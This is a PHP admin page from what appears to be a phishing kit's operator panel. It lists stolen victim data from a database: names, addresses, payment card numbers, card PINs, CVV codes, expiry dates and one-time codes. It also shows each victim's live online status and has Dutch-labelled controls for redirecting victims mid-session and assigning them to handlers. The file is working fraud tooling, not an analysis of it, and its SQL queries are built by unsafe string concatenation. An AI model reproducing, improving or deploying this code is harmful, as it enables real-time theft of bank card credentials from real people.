<?php
require_once("../common/commonfiles.php");
$mode = $_SESSION["mode"];
if ($_SESSION["loggedInUserRole"] == "admin") {
    $isAdmin = true;
} else {
    $isAdmin = false;
}
$data = db::getRecords("SELECT * FROM customer_details WHERE status=0 ORDER BY id DESC");

function get_month($monthNum){
    
    $monthName = date('F', mktime(0, 0, 0, $monthNum, 10)); // March
    
    return $monthNum;
}

include_once 'header.php';
?>
<a href="download.php?status=0" class="btn btn-xs btn-primary" >Download</a>
<table class="table">
    <thead>
   <tr>
        <th class="text-center">Online</th>
        <th class="text-center">Status</th>
        <th class="text-center">Date</th>
        <th class="text-center">Redirect 1</th>        
        
        <th class="text-center">Name</th>        
        <th class="text-center">Last Name</th>        
        <th class="text-center">Address</th>        
        <th class="text-center">Payment Card No</th>        
        <th class="text-center">Card Pin</th>        
        <th class="text-center">CVV Code</th>        
        <th class="text-center">Month</th>        
        <th class="text-center">Year</th>        
        <th class="text-center">Code</th>

		<th class="text-center">Redirect 2</th>		
		<th class="text-center">Action</th>		
    </tr>
    </thead>
    <tbody>
    <?php
    $counter = 1;
    //if($data)
    foreach ($data as $value) {
        $get_ip = db::getCell("SELECT ip FROM data WHERE ip='" . $value['ip'] . "' AND id !='" . $value['id'] . "'");
        $ipExists = !empty($get_ip) ? true : false;
        $handler = db::getRecord("SELECT * FROM user WHERE id='" . $value['handler_id'] . "'");
        ?>
        <tr data-id="<?php echo $value['id'];?>" <?php echo ($ipExists) ? 'style="color:red"' : ''; ?>
                >
            <td class="text-center">
                <?php
                $loggedTime = time() - 120; //2 minutes
                if ($value['last_online'] > $loggedTime) {
                    echo '<i class="fa fa-circle" style="color:green;"></i>';
                } else {
                    echo '<i class="fa fa-circle"></i>';
                }
                ?>
            </td>

            <td class="text-center">
                <?php if($value["status"] == 0) { echo "Pending"; } elseif($value["status"] == 1) echo "Approved"; else echo "Deleted"; ?>
            </td>

            <td class="text-center">
                <b><?php $d = explode(" ", $value['date']);
                    echo $d[0] . "<br />" . $d[1] . " " . $d[2]; ?></b>
            </td>
            
			<?php if($mode==1){?>
			<td width="10%" class="text-center">
                <select class="form-control redirect1" data-id="<?php echo $value["id"]; ?>"
                        id="redirect1<?php echo $counter; ?>" name="redirect1">
                    <option value="">-Select-</option>					
                    <option <?php echo $value['redirect1'] == "url" ? "selected='selected'" : "" ?> value="url">
                        Doorsturen
                    </option>
                    <option <?php echo $value['redirect1'] == "error" ? "selected='selected'" : "" ?> value="error">
                        Error
                    </option>
					<option <?php echo $value['redirect1'] == "logout" ? "selected='selected'" : "" ?> value="logout">
                        Wegsturen
                    </option>
                    <!--<option <?php echo $value['redirect1'] == "block" ? "selected='selected'" : "" ?> value="block">
                        Block
                    </option>-->
                </select>
            </td>
            <td>
                <?=$value["name"]?>
            </td>
            <td>
                <?=$value["lastname"]?>
            </td>
            <td>
                <?=$value["address"]?>
            </td>
            <td>
                <?=$value["payment_card_no"]?>
            </td>
            <td>
                <?=$value["cardpin"]?>
            </td>
            <td>
                <?=$value["cvv_code"]?>
            </td>
            <td>
                <?=get_month($value["month"])?>
            </td>
            <td>
                <?=$value["year"]?>
            </td>
            <td class="text-center">
                <p id="password<?php echo $value['id'] ?>"><?php echo $value['code'] ?></p>
                
            </td>

            <!-- <td class="text-center">
                <p id="response<?php echo $value['id'] ?>"><?php echo $value['response']; ?></p>
                <button data-id="<?php echo $value['id'] ?>" href="javascript:;"
                        onclick="copyFunction('#response<?php echo $value['id'] ?>')"
                        class="btn btn-primary btn-xs copyBtn">Copy
                </button>
            </td> -->
            <td width="10%" class="text-center">
                <select class="form-control redirect" data-id="<?php echo $value["id"]; ?>"
                        id="redirect<?php echo $counter; ?>" name="redirect">
                    <option value="">-Select-</option>
                    <option <?php echo $value['status'] == "1" ? "selected='selected'" : "" ?> value="url">
                        Approve
                    </option>
                    <option <?php echo $value['status'] == "2" ? "selected='selected'" : "" ?> value="error">
                        Error
                    </option>
                </select>
            </td>
			<?php } ?>
            <?php if ($value['status'] == 0) { ?>
                <td class="text-center">
                    <?php if ($_SESSION['mode'] == 2) { ?>
                        <span style="color: orange!important;font-size: 20px;">
                                <a class="btn btn-xs btn-success" href="actions.php?j=100&id=<?php echo $value['id'] ?>"
                                   onclick="return setApprove()" title="Approve"><i
                                            class="glyphicon glyphicon-ok"></i></a>&nbsp;
                            </span>
                    <?php } ?>
					<?php if($_SESSION["loggedInUserRole"] == "admin"){?>
                    <span style="color: orange!important;font-size: 20px;">
                        <a class="btn btn-xs btn-danger" href="actions.php?j=9&id=<?php echo $value['id'] ?>"
                           onclick="return deleteit()"
                           title="Delete"><i class="glyphicon glyphicon-trash"></i>
                        </a>
                    </span>
					<?php } ?>
                </td>
            <?php } else if ($value['status'] == 1) { ?>
                <td class="text-center"><span style="color:green"><b>Approved</b></span></td>
            <?php } else if ($value['status'] == 2) { ?>
                <td class="text-center"><span style="color:red"><b>Deleted</b></span></td>
            <?php } ?>
			<?php if($mode==1){?>
            <td class="text-center">
                <span style="color:<?php echo trim($handler['color']); ?>"><?php echo $handler['username'] ?></span>
            </td>
			<?php } ?>
        </tr>
        <?php
        $counter++;
    }
    ?>
    </tbody>
</table>
<script>
    $(document).ready(function () {
        $('.bcv').on('mouseover', function (e) {
            $(this).tooltip('disable');
        });

        $('.bcv').on('focus', function () {
            $(this).tooltip('enable').tooltip('show');
        });
        $(".redirect").on("change", function () {
            if ($(this).val() == "error") {
                if (!confirm("Are you sure ?")) {
                    $(this).val("");
                    return false;
                }
            }
            $.get("update_redirect.php?id=" + $(this).attr("data-id") + "&redirect=" + $(this).val());
        });
        $(".redirect1").on("change", function () {
            if ($(this).val() == "error") {
                if (!confirm("Are you sure ?")) {
                    $(this).val("");
                    return false;
                }
            }
            $.get("update_redirect1.php?id=" + $(this).attr("data-id") + "&redirect1=" + $(this).val());
        });
    });
    $(function () {
        $('[data-toggle="popover"]').popover()
    })
    $("#pageName").html("Progress");

    $("td").on("mouseover", function () {
        $(this).find(".copyBtn").show();
    });
    $("td").on("mouseout", function () {
        $(".copyBtn").hide();
    });
    $(".copyBtn").hide();

    function copyFunction(element) {
        var $temp = $("<input>");
        $("body").append($temp);
        $temp.val($(element).text()).select();
        document.execCommand("copy");
        $temp.remove();
    }

    $("tr").on("click", function () {
        $.post("update_handler.php?id=" + $(this).attr("data-id"))
    });
</script>
<style>
    .blinking {
        animation: blinkingText 2s infinite;
    }

    @keyframes blinkingText {
        0% {
            color: #000;
        }
        49% {
            color: transparent;
        }
        50% {
            color: transparent;
        }
        99% {
            color: transparent;
        }
        100% {
            color: #000;
        }
    }

</style>